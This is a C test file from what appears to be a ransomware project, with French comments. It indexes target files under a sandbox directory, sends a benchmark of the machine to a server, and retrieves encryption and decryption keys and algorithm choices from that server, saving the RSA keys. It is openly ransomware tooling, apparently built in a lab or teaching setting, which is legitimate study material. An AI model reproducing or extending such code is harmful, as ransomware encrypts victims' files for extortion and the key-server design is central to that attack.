#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#include "../crypto_rsa.h"
#include "../files_finder.h"
#include "../benchmark.h"
#include "../server.h"

int main(int argc, char const *argv[])
{
    /* code */
    char* paths[] = {"/tmp/sandbox-ransomware/"};
    char* p_algo = NULL;
    char* p_iv = NULL;
    char* id = "9";

    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Envoi du benchmark au serveur */
    benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);

    p_benchmarkData->memorySize = 8000;
    p_benchmarkData->dataSize = 2000;
    p_benchmarkData->cpuCore = 16;

    char* p_key = get_encryption_key(id, p_benchmarkData, &p_algo, &p_iv);

    printf("key: %s\n", p_key);
    printf("iv: %s\n", p_iv);
    printf("Algo: %s\n", p_algo);

    if (strncmp(p_algo, "RSA", 3) == 0)
    {
        save_key(p_key, ENC_RSA_KEY_NAME);
    }

    /* Free for decryption key data */
    free(p_key);
    free(p_iv);
    free(p_algo);

    p_key = get_decryption_key(id, &p_algo, &p_iv);

    printf("key: %s\n", p_key);
    printf("iv: %s\n", p_iv);
    printf("Algo: %s\n", p_algo);

    if (strncmp(p_algo, "RSA", 3) == 0)
    {
        save_key(p_key, DEC_RSA_KEY_NAME);
    }

    free_path_data(p_listFileData);
    free(p_benchmarkData);
    free(p_key);
    free(p_iv);
    free(p_algo);

    printf("Test passed\n");

    return EXIT_SUCCESS;
}
